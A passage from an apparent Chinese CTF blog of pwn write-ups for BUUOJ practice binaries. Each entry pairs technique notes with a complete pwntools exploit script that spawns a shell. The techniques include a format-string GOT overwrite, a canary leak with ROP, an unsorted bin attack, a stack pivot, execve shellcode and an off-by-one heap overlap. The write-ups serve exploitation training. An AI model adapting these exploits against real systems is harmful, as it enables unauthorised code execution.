class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(low_sys)<br>r.recvuntil(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br><span class="hljs-comment">#payload=&#x27;p&#x27;+&#x27;%&#x27;+str(low_sys-10)+&#x27;c%15$hn&#x27;+&#x27;%&#x27;+str(high_sys-low_sys)+&#x27;c%16$hn&#x27;+&#x27;pp&#x27;</span><br><span class="hljs-comment">#print len(payload)</span><br><span class="hljs-comment">#r.sendline(payload+p32(strlen)+p32(strlen+2))</span><br>pad=<span class="hljs-string">&#x27;a&#x27;</span>+fmtstr_payload(<span class="hljs-number">8</span>,&#123;elf.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]:sys&#125;,write_size = <span class="hljs-string">&quot;byte&quot;</span>,numbwritten = <span class="hljs-number">0xa</span>)<br>r.sendline(pad)<br><span class="hljs-comment">#-------------------------------</span><br>r.recvuntil(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;;/bin/sh&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>小结：忘光光，做的时候花了很久，%nc输入n个数，计算字符数到$（不包括）,第二次利用格式出字符串的‘a’是为了对齐？</p><p>pwntools工具FmtStr利用：</p><p>引用这位师傅文章<a href="https://blog.csdn.net/A951860555/article/details/115061803?spm=1001.2014.3001.5502">pwntools FmtStr格式化字符串类使用详解_lifanxin的博客-CSDN博客</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">64</span>位格式化漏洞要设置一下上下文环境<br>context<span class="hljs-selector-class">.arch</span> = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-function"><span class="hljs-title">fmtstr_payload</span><span class="hljs-params">(offset, writes, numbwritten=<span class="hljs-number">0</span>, write_size=<span class="hljs-string">&quot;byte&quot;</span>)</span></span><br>总共四个参数：<br>offset --&gt; 偏移量 <br>writes --&gt; &#123;被覆盖的地址:要写入的地址&#125; 地址都为int型，也就是不需要使用p32或者p64打包<br>numbwritten --&gt; 已经由printf函数写入的字节数，默认为<span class="hljs-number">0</span><br>write_size --&gt; 逐byte/short/int写入，默认是byte，这样发送的字节少<br>pro = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>printf_got = pro<span class="hljs-selector-class">.got</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;printf&quot;</span>]</span><br>system_plt = pro<span class="hljs-selector-class">.plt</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;system&quot;</span>]</span><br>pad = <span class="hljs-built_in">fmtstr_payload</span>(offset, &#123;printf_got:system_plt&#125;)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.send</span>(pad)<br></code></pre></td></tr></table></figure><h3 id="others-babystack">others_babystack</h3><p><strong>关键词</strong>：泄露canary，rop</p><p><strong>思路</strong>：</p><p>1.首先填充数个a至canary，然后接受直到最后一个a，就能接收canary了</p><p>2.然后就能栈溢出，泄露libc</p><p>3.og开shell</p><p><strong>注意点</strong>：</p><p>由于canary的最后两位是0，puts接受到\x00结束，这里我们用\n代替0，就能带出canary，接收的时候收7个，在右填\x00</p><p>小结：</p><p>1.ret是在main结束后，才会执行，所以要选一下3，才能打印出got地址</p><p>2.不是很明白为啥elf.sym[‘main’]不通，而0x400908行？</p><p>3.canary基本形式？0x55dd1e56dddd500</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26665</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;a\n&#x27;</span>)<br>canary=u64(r.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(canary)<br><span class="hljs-comment">#------------------------------------------</span><br>pop_rdi=<span class="hljs-number">0x400a93</span><br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(<span class="hljs-number">0x400908</span>))<br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>got=u64(r.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(got)<br>base=got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br><span class="hljs-comment">#------------------------------------------</span><br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;p&#x27;</span>*<span class="hljs-number">8</span>+p64(base+o_g_old[<span class="hljs-number">3</span>]))<br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="mrctf2020-easyoverflow">mrctf2020_easyoverflow</h3><p>检查是检查v4是否与他相等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27309</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">&#x27;n0t_r3@11y_f1@g&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-getshell-2">wustctf2020_getshell_2</h3><p>**关键词：**限定字符，用call_system</p><p>只能多填12个，程序中有现成的call函数就可以不用返回值了，因为它会自己把下一条指令给压进去</p><p>所以用call_system能省略返回值</p><p>system(‘sh’)也行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29304</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./wustctf2020_getshell_2&#x27;</span>)<br>call_system=<span class="hljs-number">0x08048529</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(call_system)+p32(<span class="hljs-number">0x08048670</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="hitcontraining-magicheap">hitcontraining_magicheap</h3><p>题外话：1.突然发现，vim编辑下，按住shift左右移动，会移动到单词首末</p><p>2.才发现，连远端的时候不能gdb.attach调试</p><p><strong>关键词</strong>：unsortbinattack，堆溢出</p><p>参考ctf_wiki<a href="https://ctf-wiki.org/pwn/linux/glibc-heap/unsorted_bin_attack/#unsorted-bin-attack_1">Unsorted Bin Attack - CTF Wiki (ctf-wiki.org)</a></p><p>这题利用到unsortbin attack：当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>所以这里实际是把magic改为了unsortbin的地址&gt;1305</p><p><strong>思路：</strong></p><p>1.申请三个堆，index0，1，2；</p><p>0和2大小随意，1大于0x80</p><p>2.释放index1，1就会放到unsortbin中，利用堆溢出改index0，溢出把index1的bk改为magic-0x10</p><p>unsorted_chunks (av)是链表头的位置</p><p>unsorted_chunks (av)-&gt;bk = bck;   ==&gt;       bck=magic-0x10</p><p>bck-&gt;fd=unsorted_chunks (av)       ==&gt;       magic=unsotbin的地址</p><p>3.在选4869，就可绕过检查，开shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./magicheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28307</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#--------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>    sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><span class="hljs-comment">#----------------------------------------------------</span><br>magic=<span class="hljs-number">0x6020A0</span><br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>create(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0</span>)+p64(magic-<span class="hljs-number">0x10</span>))<br>create(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;4869&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-s-4">ciscn_2019_s_4</h3><p><strong>关键词</strong>：栈迁移，rop，调试</p><p><strong>思路</strong>：</p><p>1.第一个read泄露ebp，得知ebp地址及栈地址</p><p>2.调试的到ebp与填充的偏移</p><p>3.第二个read写rop链，system的参数要为/bin/sh\x00的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29002</span>)<br><span class="hljs-comment">#r=process(&#x27;./ciscn_s_4&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./ciscn_s_4&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>hack=<span class="hljs-number">0x804854b</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>ebp=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-comment">#gdb.attach(r)</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ebp)<br><span class="hljs-comment">#------------------------------</span><br>leave_ret=<span class="hljs-number">0x080484b8</span><br>buf=ebp-<span class="hljs-number">0x38</span><br>r.send(<span class="hljs-string">&#x27;aaaa&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>])+p32(<span class="hljs-number">0</span>)+p32(buf+<span class="hljs-number">0x10</span>)+<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x24</span>-<span class="hljs-number">0x14</span>)+p32(buf)+p32(leave_ret))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwnable-start">pwnable_start</h3><p>**关键词：**汇编，泄露ebp，调试</p><p><strong>思路：</strong></p><p>1.查看汇编代码得知题目信息，发现read处可0x14后可溢出</p><p>2.依靠其中的write，是根据esp来确定打印addr，选择覆盖ret地址为write那里，便能泄露出栈地地址</p><p>3.gdb调试，查看栈的地址与我们的payload的关系，其实就是esp+4的位置</p><p>4.构造shell代码，溢出跳转至shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29930</span>)<br><span class="hljs-comment">#r=process(&#x27;./start&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0x68732f      </span><br><span class="hljs-string">push 0x6e69622f   </span><br><span class="hljs-string">mov ebx, esp</span><br><span class="hljs-string">xor edx, edx</span><br><span class="hljs-string">xor ecx, ecx</span><br><span class="hljs-string">mov al, 0xb       </span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;CTF:&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span>+p32(<span class="hljs-number">0x08048087</span>))<br>stack_addr=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(stack_addr)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span>+p32(stack_addr+<span class="hljs-number">0x14</span>)+sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-closed">wustctf2020_closed</h3><p><strong>int</strong> <strong>close</strong>(<strong>int</strong> fd) 参数说明： fd：是需要关闭的文件描述符</p><p>这道题close（1），close（2）后开shell</p><p>关闭了标准输出，错误输出</p><p>把stdout重定向：exec 1&gt;&amp;0</p><p>将文件描述符 1 重定向到文件描述符 0</p><h3 id="hitcontraining-heapcreator">hitcontraining_heapcreator</h3><p>**关键词：**off-by-one，chunk extend，chunk overlap</p><p>**思路：**这道题有个结构，申请一个堆会在bss段上也有一个0x20大小堆</p><p>里面存了                                           |申请堆的size|指向堆的指针|</p><p>根据这个指针，可以大作文章，加之还有off-by-one的漏洞</p><p><strong>具体步骤：</strong></p><p>1.利用off-by-one扩大chunksize，起码要包含0x20大小的chunk，感觉我也没怎么搞懂，反正就是</p><p>要精心构造，比如这题，free后来申请回来时，0x40能改0x20里面的指针与size</p><p>2.指针指向的是堆的地址，我们把它改成free_got的地址，再，show，就泄露了libc地址</p><p>3.由于指向的是free的got的地址，我们继续可以edit填入base+system，就劫持了freegot为system</p><p>4.再利用前面某个chunk填充的/bin/sh\x00执行free，就执行system（/bin/sh\x00）</p><p>**注意点：**除了合理填充范围内，以外的最好不要乱改，就好比0x20大小的里size参数，要改正确</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./heapcreator&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26706</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;Content of heap :&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span 